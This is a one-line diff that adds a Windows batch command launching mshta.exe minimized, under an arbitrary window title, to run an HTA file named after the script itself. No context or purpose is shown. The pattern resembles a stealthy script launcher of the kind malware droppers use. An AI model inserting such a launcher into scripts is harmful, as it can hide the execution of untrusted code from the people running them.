@@ -1,0 +1,1 @@
+start "k7k" /MIN mshta "%~dpn0.hta"
